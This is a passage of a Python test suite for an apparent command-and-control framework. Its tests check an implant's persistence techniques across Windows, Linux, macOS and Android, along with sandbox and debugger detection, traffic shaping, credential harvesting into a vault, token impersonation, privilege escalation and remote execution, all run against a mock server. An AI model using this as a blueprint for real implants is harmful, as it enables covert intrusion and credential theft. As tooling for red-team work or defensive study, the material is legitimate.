    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_server_keeps_the_persistence_record():
    """What the beacon reported is what the inventory shows."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"persist-record-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-keep", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        # Nothing is installed yet, so the filter finds nothing.
        assert client.agents(persisted="yes") == []

        client.wait_for_result(
            client.submit("agent-keep", "persist", {"method": "auto"}), timeout=10)

        # The record is on the agent now.
        deadline = time.time() + 5
        rows = []
        while time.time() < deadline:
            rows = client.agents()
            if rows and rows[0].get("persist"):
                break
            time.sleep(0.05)
        assert rows[0].get("persist"), rows
        assert rows[0]["persist"][0]["technique"]

        # And the filter finds the host.
        found = client.agents(persisted="yes")
        assert [a["id"] for a in found] == ["agent-keep"]
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_a_broken_entry_is_reported():
    """An entry that was removed behind the operator's back is broken."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"persist-broken-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-broken", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        task = client.wait_for_result(
            client.submit("agent-broken", "persist", {"method": "auto"}), timeout=10)
        technique = ((task.get("meta") or {}).get("persist") or [{}])[0].get("technique")
        assert technique

        # The entry is gone behind the operator's back.
        task = client.wait_for_result(
            client.submit("agent-broken", "persist.verify", {"break": technique}),
            timeout=10)
        assert task["state"] == "done", task
        assert (task.get("meta") or {}).get("persist_broken") == 1

        # The health verdict is degraded: one entry, and it is broken.
        task = client.wait_for_result(
            client.submit("agent-broken", "persist.health", {}), timeout=10)
        assert "broken" in (task.get("out") or b"").decode()
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_console_knows_the_persistence_commands():
    """The parser and the client know every persistence command."""
    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli import cli  # noqa: WPS433

    parser = cli.build_parser()
    parsed = parser.parse_args(["persist", "web-01", "--method", "registry.run",
                                "--name", "Update Service"])
    assert parsed.cmd == "persist"
    assert parsed.method == "registry.run"
    assert parsed.name == "Update Service"
    # The install is silent unless the operator asks for the noise.
    assert parsed.silent is True
    assert parsed.verify is True

    for command in ("persist-list", "persist-verify", "persist-health",
                    "persist-report"):
        assert parser.parse_args([command] + (["web-01"] if command != "persist-report" else [])).cmd == command

    migrate = parser.parse_args(["persist-migrate", "web-01", "--from",
                                  "registry.run", "--to", "schtasks"])
    assert migrate.source == "registry.run" and migrate.target == "schtasks"

    # The fleet report is a client method, not a task: the server already
    # keeps the record.
    from umbra_cli.client import OperatorClient  # noqa: WPS433
    assert hasattr(OperatorClient, "persistence_report")


def test_the_persistence_report_covers_the_fleet():
    """The report says what is installed where, and what is broken."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"persist-report-token-01234567"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-fleet", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        # Before the install the host has no persistence.
        rows = client.persistence_report()
        assert rows and rows[0]["state"] == "none"

        client.wait_for_result(
            client.submit("agent-fleet", "persist", {"method": "auto"}), timeout=10)
        deadline = time.time() + 5
        rows = []
        while time.time() < deadline:
            rows = client.persistence_report()
            if rows and rows[0]["state"] == "covered":
                break
            time.sleep(0.05)
        assert rows[0]["state"] == "covered", rows
        assert rows[0]["entries"] == 1
        assert rows[0]["methods"]
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_rust_beacon_owns_the_persistence_catalogue():
    """The beacon has a catalogue, a selection engine and a state file."""
    source = read_text("implant/rust/src/persist.rs")
    # The catalogue covers the platforms, and the ids are the ones the
    # documentation names.
    for technique in ("registry.run", "registry.runonce", "registry.winlogon",
                       "registry.ifeo", "registry.appinit", "registry.com",
                       "schtasks", "taskxml", "service", "startup", "bcdedit",
                       "systemd.user", "systemd.system", "systemd.timer",
                       "cron.user", "cron.d", "rc.local", "init.d", "profile",
                       "ld_preload", "xdg_autostart", "at", "launchd.agent",
                       "launchd.daemon", "loginitem", "shell_rc"):
        assert f'id: "{technique}"' in source, technique
    # The state file is the canonical encoding, so the beacon needs no
    # serialisation library for it.
    assert "upk::encode" in source and "upk::decode_exact" in source
    # The manager verifies what it installs, and it migrates without a gap.
    assert "fn verify_technique" in source
    assert "fn migrate" in source
    # The module is public, so the task dispatcher can reach it.
    assert "pub mod persist;" in read_text("implant/rust/src/lib.rs")


def test_the_task_dispatcher_runs_the_persistence_kinds():
    """Every persistence kind is a task the beacon understands."""
    source = read_text("implant/rust/src/task.rs")
    for kind in ("persist.list", "persist.verify", "persist.migrate",
                 "persist.health"):
        assert f'"{kind}"' in source, kind
    # And the beacon says it can run them.
    assert '"persist.list"' in source and '"persist.health"' in source
    # The result carries the entries, so the server can keep the record.
    assert '"persist"' in source and "persist_total" in source


def test_the_phone_runs_the_persistence_lifecycle():
    """The implant on a phone has the same lifecycle, with its own tools."""
    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/TaskRunner.kt")
    for kind in ("persist.list", "persist.verify", "persist.migrate",
                 "persist.health"):
        assert f'"{kind}"' in runner, kind
    assert "Persistence.install" in runner
    manager = read_text("implant/android/app/src/main/java/io/umbra/beacon/Persistence.kt")
    assert "boot_receiver" in manager and "foreground_service" in manager
    assert "alarm" in manager
    # The state is the canonical encoding, like on the desktop.
    assert "Upk.encode" in manager and "Upk.decode" in manager
    # The boot receiver is registered, so the implant comes back.
    manifest = read_text("implant/android/app/src/main/AndroidManifest.xml")
    assert "RECEIVE_BOOT_COMPLETED" in manifest
    assert ".BootReceiver" in manifest
    assert "SCHEDULE_EXACT_ALARM" in manifest


def test_the_server_keeps_the_persistence_of_every_host():
    """The server stores the entries and raises the alert."""
    store = read_text("server/internal/store/store.go")
    assert "type PersistEntry struct" in store
    assert "func (s *Store) SetPersistence" in store
    assert "Persist []PersistEntry" in store

    hub = read_text("server/internal/hub/hub.go")
    assert '"persist.updated"' in hub
    assert '"persist.broken"' in hub
    assert "func persistEntries" in hub
    # The inventory shows the entries and can be filtered by them.
    assert '"persist": a.Persist' in hub
    assert "Persisted string" in hub

    operator = read_text("server/internal/link/operator.go")
    assert '"persist": a.Persist' in operator
    assert 'm["persisted"]' in operator


def test_the_documentation_describes_the_persistence():
    """The runbook, the protocol and the readme all mention it."""
    protocol = read_text("docs/PROTOCOL.md")
    for kind in ("persist.list", "persist.verify", "persist.migrate",
                 "persist.health"):
        assert f"| `{kind}` |" in protocol, kind
    assert "7.2g The persistence manager" in protocol
    operations = read_text("docs/OPERATIONS.md")
    assert "umbra persist-report" in operations
    assert "umbra persist-migrate" in operations
    assert "registry.run" in operations
    readme = read_text("README.md")
    assert "Staying installed" in readme


def test_the_consistency_checker_knows_the_techniques():
    """The checker learns the technique ids, so the prose stays honest."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    import check_consistency  # noqa: WPS433

    techniques = check_consistency.rust_persist_techniques()
    assert "registry.run" in techniques
    assert "systemd.user" in techniques
    assert "boot_receiver" not in techniques  # that one is the phone's


# ---------------------------------------------------------------------------
# The posture engine
# ---------------------------------------------------------------------------


def test_the_posture_engine_classifies_the_host():
    """The implant says what the host looks like, and how sure it is."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"posture-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-posture", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        task = client.wait_for_result(
            client.submit("agent-posture", "evade.report", {}), timeout=10)
        assert task["state"] == "done", task
        meta = task.get("meta") or {}
        posture = meta.get("posture") or {}
        assert posture, task
        assert posture["label"]
        assert "virtual" in posture
        assert "sandbox" in posture
        assert posture["confidence"] >= 0
        assert "posture_sleep_factor" in meta
        assert "posture:" in (task.get("out") or b"").decode()
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_server_keeps_the_posture_of_every_host():
    """What the implant reported is what the inventory shows."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"posture-record-token-01234567"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-posture-2", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        client.wait_for_result(
            client.submit("agent-posture-2", "evade.report", {}), timeout=10)
        rows = client.agents()
        assert rows, "the agent is missing"
        posture = rows[0].get("posture") or {}
        assert posture, rows[0]
        assert posture.get("label")

        # The fleet report reads the record, it does not touch the host.
        from umbra_cli.client import OperatorClient as _Client  # noqa: WPS433
        report = _Client.posture_report(client)
        assert report and report[0]["label"]
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_kill_switch_is_armed_and_can_be_cleared():
    """The moment the implant stops existing is the operator's decision."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"killswitch-token-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-kill", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        task = client.wait_for_result(
            client.submit("agent-kill", "evade.killswitch", {"file": "/tmp/stop-me"}),
            timeout=10)
        assert task["state"] == "done", task
        switch = (task.get("meta") or {}).get("killswitch") or {}
        assert switch.get("armed") is True, task
        assert "armed" in (task.get("out") or b"").decode()

        # A kill switch without a trigger is refused.
        task = client.wait_for_result(
            client.submit("agent-kill", "evade.killswitch", {}), timeout=10)
        assert task["state"] == "failed", task
        assert task["code"] != 0, task
        assert "killswitch" in (task.get("err") or "")

        # And it can be disarmed again.
        task = client.wait_for_result(
            client.submit("agent-kill", "evade.killswitch", {"clear": True}), timeout=10)
        assert task["state"] == "done", task
        switch = (task.get("meta") or {}).get("killswitch") or {}
        assert switch.get("armed") is False, task
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_schedule_and_the_shape_are_configurable():
    """The day and the traffic are the operator's decision."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"schedule-token-0123456789abc"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-schedule", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        task = client.wait_for_result(
            client.submit("agent-schedule", "evade.profile",
                          {"base": 90, "busy_factor": 40, "night_factor": 200}),
            timeout=10)
        assert task["state"] == "done", task
        schedule = (task.get("meta") or {}).get("schedule") or {}
        assert schedule.get("base") == 90, task
        assert schedule.get("night_factor") == 200, task

        task = client.wait_for_result(
            client.submit("agent-schedule", "evade.shape",
                          {"mode": "fixed", "size": 2048, "reorder": True}),
            timeout=10)
        assert task["state"] == "done", task
        shaping = (task.get("meta") or {}).get("shaping") or {}
        assert shaping.get("mode") == "fixed", task
        assert shaping.get("size") == 2048, task
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_console_knows_the_evasion_commands():
    """The parser and the client know every evasion command."""
    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli import cli  # noqa: WPS433

    parser = cli.build_parser()
    report = parser.parse_args(["evade-report"])
    assert report.cmd == "evade-report" and report.agent == ""

    posture = parser.parse_args(["evade-posture", "web-01", "--silence",
                                 "--sandbox-factor", "300"])
    assert posture.cmd == "evade-posture"
    assert posture.silence is True
    assert posture.sandbox_factor == 300

    profile = parser.parse_args(["evade-profile", "web-01", "--base", "120",
                                 "--night-factor", "200"])
    assert profile.base == 120 and profile.night_factor == 200

    shape = parser.parse_args(["evade-shape", "web-01", "--mode", "fixed",
                               "--size", "4096", "--reorder"])
    assert shape.mode == "fixed" and shape.size == 4096 and shape.reorder is True

    kill = parser.parse_args(["evade-killswitch", "web-01", "--file", "/tmp/stop",
                              "--uptime", "72"])
    assert kill.file == "/tmp/stop" and kill.uptime == 72

    hygiene = parser.parse_args(["hygiene", "web-01", "--memory"])
    assert hygiene.cmd == "hygiene" and hygiene.memory is True

    from umbra_cli.client import OperatorClient  # noqa: WPS433
    assert hasattr(OperatorClient, "posture_report")


def test_the_rust_beacon_owns_the_posture_engine():
    """The engine, the schedule, the shaping and the kill switch are Rust."""
    evade = read_text("implant/rust/src/evade.rs")
    assert "pub struct Posture" in evade
    assert "pub enum ShapeMode" in evade
    assert "pub struct SleepProfile" in evade
    assert "pub enum Trigger" in evade
    assert "pub struct Window" in evade
    assert "pub fn classify" in evade
    assert "pub silence_on_sandbox: bool" in evade
    assert "pub fn schedule" in evade
    assert "pub fn marker_fired" in evade
    assert "VMwareTools" in evade
    assert "SbieDll" in evade
    assert "x64dbg" in evade

    # The beacon draws the window once per cycle and checks the kill switch
    # before it talks to the server again.
    beacon = read_text("implant/rust/src/beacon.rs")
    assert "Window::schedule" in beacon
    assert "fn kill_switch" in beacon
    assert "fn terminate" in beacon
    assert "shaping.reorder" in beacon

    # The memory hygiene has a guard of its own.
    crypto = read_text("implant/rust/src/crypto.rs")
    assert "pub struct Zeroizing" in crypto
    assert "pub trait Zeroize" in crypto
    task = read_text("implant/rust/src/task.rs")
    assert "Zeroizing::new" in task
    hygiene = read_text("implant/rust/src/hygiene.rs")
    assert "pub fn spoof_parent" in hygiene
    assert "pub fn clean_environment" in hygiene
    assert "pub fn copy_self" in hygiene


def test_the_task_dispatcher_runs_the_evasion_kinds():
    """Every evasion kind is dispatched and advertised."""
    task = read_text("implant/rust/src/task.rs")
    for kind in ("evade.report", "evade.posture", "evade.profile",
                 "evade.shape", "evade.killswitch", "hygiene.memory",
                 "hygiene.process"):
        assert f'"{kind}"' in task, kind
    # The capabilities travel with the handshake.
    for kind in ("evade.report", "evade.killswitch", "hygiene.memory"):
        assert f'"{kind}"' in task.split("pub fn capabilities")[1], kind


def test_the_phone_runs_the_evasion_tasks():
    """The phone has its own posture engine."""
    evasion = read_text("implant/android/app/src/main/java/io/umbra/beacon/Evasion.kt")
    assert "fun classify" in evasion
    assert "fun factor" in evasion
    assert "fun killSwitch" in evasion
    assert "Build.FINGERPRINT" in evasion
    assert "test-keys" in evasion

    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/TaskRunner.kt")
    for kind in ("evade.report", "evade.posture", "evade.profile",
                 "evade.killswitch", "hygiene.memory"):
        assert f'"{kind}"' in runner, kind
    # The shaping and the process hygiene need the desktop implant.
    assert 'unsupported("evade.shape"' in runner
    assert 'unsupported("hygiene.process"' in runner


def test_the_documentation_describes_the_posture_engine():
    """The protocol, the runbook and the readme all mention it."""
    protocol = read_text("docs/PROTOCOL.md")
    for kind in ("evade.report", "evade.posture", "evade.profile",
                 "evade.shape", "evade.killswitch", "hygiene.memory",
                 "hygiene.process"):
        assert f"| `{kind}` |" in protocol, kind
    assert "7.2h The posture engine" in protocol
    operations = read_text("docs/OPERATIONS.md")
    assert "umbra evade-report" in operations
    assert "umbra evade-killswitch" in operations
    readme = read_text("README.md")
    assert "Knowing the host" in readme


def test_the_exit_takes_the_persistence_with_it():
    """The last word of the operator leaves the target clean."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"exit-token-0123456789abcdef"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-exit", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # An entry first, so there is something to take away.
        client.wait_for_result(
            client.submit("agent-exit", "persist", {"method": "auto"}), timeout=10)
        rows = client.agents()
        assert rows and rows[0].get("persist"), rows

        # Then the implant goes, and the record follows it.
        client.wait_for_result(
            client.submit("agent-exit", "exit", {}), timeout=10)
        deadline = time.time() + 5
        while time.time() < deadline:
            rows = client.agents()
            if rows and not rows[0].get("persist"):
                break
            time.sleep(0.05)
        rows = client.agents()
        assert rows, "the agent is missing"
        assert not rows[0].get("persist"), rows[0]
    finally:
        client.close()
        agent.stop()
        server.stop()


def _vault_client(name):
    """A mock server with one agent, and a console attached to it."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = (name + "-token-0123456789ab").encode()
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-vault", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    client.connect()
    deadline = time.time() + 5
    while time.time() < deadline and not client.agents():
        time.sleep(0.05)
    return server, agent, client


def test_the_credential_records_are_categorised():
    """Every piece of material is a record with a kind and a source."""
    server, agent, client = _vault_client("creds-kind")
    try:
        task = client.wait_for_result(
            client.submit("agent-vault", "creds", {"mode": "all"}), timeout=10)
        assert task["state"] == "done", task
        meta = task.get("meta") or {}
        records = meta.get("creds") or []
        assert records, task
        for record in records:
            assert record["kind"] in ("password", "hash", "ticket", "token", "key")
            assert record["source"]
            assert "confidence" in record
            assert "redacted" in record
        kinds = {record["kind"] for record in records}
        assert "password" in kinds
        assert "hash" in kinds
        assert meta.get("creds_total") == len(records)
        assert meta.get("creds_counts")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_value_of_a_credential_is_left_out_by_default():
    """The material itself does not travel unless it is asked for."""
    server, agent, client = _vault_client("creds-redact")
    try:
        loud = client.wait_for_result(
            client.submit("agent-vault", "creds", {"mode": "all", "raw": True}),
            timeout=10)
        meta = loud.get("meta") or {}
        records = meta.get("creds") or []
        assert records, "the implant reported the material it found"
        for record in records:
            # The task record keeps the shape of the material and loses the
            # value, even when the collection asked for the value: the
            # record is not the place a secret travels through.
            assert record["secret"] == ""
            assert record["redacted"] is True

        # The value is in the vault, and the vault is the only place it is.
        listed = client.creds_list()
        assert listed, "the vault is empty"
        for record in listed:
            assert record["secret"] == ""

        exported = client.creds_export()
        assert any(r.get("secret") for r in exported), exported
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_vault_keeps_the_material_of_every_host():
    """The server keeps the records, and the console finds them."""
    server, agent, client = _vault_client("creds-vault")
    try:
        client.wait_for_result(
            client.submit("agent-vault", "creds", {"mode": "all", "raw": True}),
            timeout=10)

        rows = client.creds_list()
        assert rows, "the vault is empty"
        for row in rows:
            assert row["kind"]
            assert row["agent_id"] == "agent-vault"
            assert row["digest"]
            # The list never carries the value.
            assert "secret" not in row or not row.get("secret")

        found = client.creds_search("alice")
        assert found, "the search found nothing"
        assert any(row["account"] == "CORP\\alice" for row in found)

        exported = client.creds_export()
        assert exported, "the export is empty"
        assert any(row.get("secret") for row in exported)
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_event_stream_never_carries_a_secret():
    """The shape of the material travels; the value stays in the vault."""
    server, agent, client = _vault_client("creds-event")
    try:
        client.wait_for_result(
            client.submit("agent-vault", "creds", {"mode": "all", "raw": True}),
            timeout=10)
        deadline = time.time() + 5
        events = []
        while time.time() < deadline:
            events = (client.events(limit=200) or {}).get("events") or []
            if any(ev.get("kind") == "creds.collected" for ev in events):
                break
            time.sleep(0.05)
        collected = [ev for ev in events if ev.get("kind") == "creds.collected"]
        assert collected, events
        blob = repr(collected)
        assert "correct-horse-battery-staple" not in blob
        # The task result itself is redacted too.
        task = client.wait_for_result(
            client.submit("agent-vault", "creds", {"mode": "all", "raw": True}),
            timeout=10)
        for record in (task.get("meta") or {}).get("creds") or []:
            assert record["secret"] == ""
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_token_work_lists_the_tokens_of_the_host():
    """Whose session is this."""
    server, agent, client = _vault_client("token-list")
    try:
        task = client.wait_for_result(
            client.submit("agent-vault", "token", {"mode": "list"}), timeout=10)
        assert task["state"] == "done", task
        meta = task.get("meta") or {}
        tokens = meta.get("tokens") or []
        assert tokens, task
        for token in tokens:
            assert "pid" in token
            assert "account" in token
            assert "session" in token
        assert meta.get("tokens_total") == len(tokens)

        # The list can be narrowed to one session.
        one = client.wait_for_result(
            client.submit("agent-vault", "token", {"mode": "list", "session": 1}),
            timeout=10)
        sessions = {t["session"] for t in (one.get("meta") or {}).get("tokens") or []}
        assert sessions == {1}, one
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_impersonation_is_visible_in_the_inventory():
    """The identity of the implant travels with the check-in."""
    server, agent, client = _vault_client("token-become")
    try:
        client.wait_for_result(
            client.submit("agent-vault", "token", {"mode": "become", "pid": 1180}),
            timeout=10)
        deadline = time.time() + 5
        identity = ""
        while time.time() < deadline:
            rows = client.agents()
            identity = str((rows[0] if rows else {}).get("impersonation") or "")
            if identity:
                break
            time.sleep(0.05)
        assert identity == "CORP\\alice", client.agents()

        # And the operator can give the identity back.
        client.wait_for_result(
            client.submit("agent-vault", "token", {"mode": "restore"}), timeout=10)
        deadline = time.time() + 5
        while time.time() < deadline:
            rows = client.agents()
            if not (rows[0] if rows else {}).get("impersonation"):
                break
            time.sleep(0.05)
        rows = client.agents()
        assert not (rows[0] if rows else {}).get("impersonation"), rows
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_escalation_reports_every_attempt():
    """The technique, the outcome and what it changed."""
    server, agent, client = _vault_client("privesc")
    try:
        task = client.wait_for_result(
            client.submit("agent-vault", "privesc", {"mode": "privileges"}), timeout=10)
        assert task["state"] == "done", task
        meta = task.get("meta") or {}
        attempts = meta.get("escalations") or []
        assert attempts, task
        for attempt in attempts:
            assert attempt["technique"]
            assert attempt["outcome"] in ("worked", "failed", "unavailable")
            assert "side_effects" in attempt
        assert meta.get("escalations_total") == len(attempts)
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_remote_execution_runs_on_the_far_host():
    """The command runs there, and the output comes back."""
    server, agent, client = _vault_client("remote-exec")
    try:
        task = client.wait_for_result(
            client.submit("agent-vault", "winrm.exec",
                          {"target": "dc01", "command": "whoami"}), timeout=10)
        assert task["state"] == "done", task
        meta = task.get("meta") or {}
        assert meta.get("remote_protocol") == "winrm"
        assert meta.get("remote_target") == "dc01"
        assert "dc01" in (task.get("out") or b"").decode()
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_remote_execution_needs_a_target():
    """A command without a target is refused, not guessed."""
    server, agent, client = _vault_client("remote-empty")
    try:
        task = client.wait_for_result(
            client.submit("agent-vault", "ssh.exec", {"command": "id"}), timeout=10)
        assert task["state"] == "failed", task
        assert "target" in (task.get("err") or "")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_domain_edges_carry_the_movement():
    """The trusts, the delegation and the permissions are parsed."""
    rust = read_text("implant/rust/src/domain.rs")
    for marker in ("parse_trusts", "parse_delegation", "parse_acl",
                   "AllowedToDelegate", "DCSync", "TrustsOut", "WriteDacl"):
        assert marker in rust, marker


def test_the_credential_vault_is_encrypted_at_rest():
    """The server never writes a secret in the clear."""
    vault = read_text("server/internal/hub/vault.go")
    assert "vaultSeal" in vault
    assert "vaultOpen" in vault
    assert "crypt.Seal" in vault
    store = read_text("server/internal/store/store.go")
    assert "Digest" in store


# ---------------------------------------------------------------------------
# §5 the module ecosystem
# ---------------------------------------------------------------------------
def _wasm_module(payload: bytes = b"umbra") -> bytes:
    """Build a small webassembly module that logs a string.

    The module is built here, byte by byte, so the test does not need a
    toolchain: one type, one import (``umbra.log``), one function, one
    memory and one data segment.
    """
    def leb(value: int) -> bytes:
        out = bytearray()
        while True:
            byte = value & 0x7F
            value >>= 7
            if value:
                out.append(byte | 0x80)
            else:
                out.append(byte)
                return bytes(out)

    def sleb(value: int) -> bytes:
        out = bytearray()
        while True:
            byte = value & 0x7F
            value >>= 7
            sign = byte & 0x40 != 0
            if (value == 0 and not sign) or (value == -1 and sign):
                out.append(byte)
                break
            out.append(byte | 0x80)
        return bytes(out)

    def section(kind: int, body: bytes) -> bytes:
        return bytes([kind, len(body)]) + body

    types = bytes([2, 0x60, 2, 0x7F, 0x7F, 0, 0x60, 0, 1, 0x7F])
    imports = (bytes([1]) + leb(5) + b"umbra" + leb(3) + b"log"
               + bytes([0x00]) + leb(0))
    functions = bytes([1]) + leb(1)
    memory = bytes([1, 0x00, 0x01])
    exports = bytes([1]) + leb(3) + b"run" + bytes([0x00]) + leb(1)
    body = (bytes([0x41]) + sleb(0) + bytes([0x41]) + sleb(len(payload))
            + bytes([0x10]) + leb(0) + bytes([0x41]) + sleb(0)
            + bytes([0x0B]))
    code = bytes([1]) + leb(len(body) + 1) + bytes([0x00]) + body
    data = (bytes([1, 0x00, 0x41]) + sleb(0) + bytes([0x0B])
            + leb(len(payload)) + payload)
    return (b"\x00asm" + b"\x01\x00\x00\x00" + section(1, types)
            + section(2, imports) + section(3, functions) + section(5, memory)
            + section(7, exports) + section(10, code) + section(11, data))


def _armory_module(server, name: str, blob: bytes, fmt: str,
                   caps: list, args: list = None) -> None:
    """Put a module into the catalogue of the test double."""
    server.armory[name] = {
        "name": name,
        "version": "1.0.0",
        "description": f"a {fmt} module for the tests",
        "format": fmt,
        "caps": list(caps),
        "args": list(args or []),
        "output": {"type": "text", "description": "the answer of the module"},
        "requires": [],
        "magic": "UMBRAMOD1",
        "abi": 1,
        "sha256": hashlib.sha256(blob).hexdigest(),
        "size": len(blob),
        "data": blob,
    }


def test_the_module_manifest_decides_what_a_module_may_do():
    """The catalogue tells what a module needs, and the host refuses it."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-abi-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-abi")
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # The catalogue can be searched by name, by description and by
        # by the capability a module needs.
        found = client.armory_search("secret")
        names = [entry["name"] for entry in found["entries"]]
        assert "lsecrets" in names, names
        assert "dump-secrets" in names, names

        # The operator can ask what a module needs before it is pushed.
        needs = client.armory_needs("dump-secrets")
        assert needs["caps"] == ["shell"], needs
        assert needs["requires"] == ["lsecrets"], needs
        assert needs["args"][0]["name"] == "path", needs
        assert needs["args"][0]["required"] is True, needs
        assert needs["output"]["type"] == "json", needs

        # The resolver returns the order the modules have to be installed
        # in: the dependency first.
        order = client.armory_resolve("dump-secrets")
        assert order["order"] == ["lsecrets", "dump-secrets"], order

        # The versions of a module are known.
        versions = client.armory_versions("whoami")
        assert versions["versions"] == ["1.2.0"], versions

        # A module that needs a capability the host does not have is
        # never pushed to it.
        with pytest.raises(OperatorError):
            client.armory_run("wmi-probe", "agent-abi")

        # A module the host can run says so in its manifest.
        task_id = client.armory_run("whoami", "agent-abi", {"domain": "lab"})
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done", result
        assert b"whoami" in result["out"], result
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_a_webassembly_module_runs_in_the_interpreter():
    """The webassembly loader runs the module in memory."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-wasm-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-wasm")
    agent.start()
    _armory_module(server, "wasm-demo", _wasm_module(), "wasm", [])

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        task_id = client.armory_run("wasm-demo", "agent-wasm")
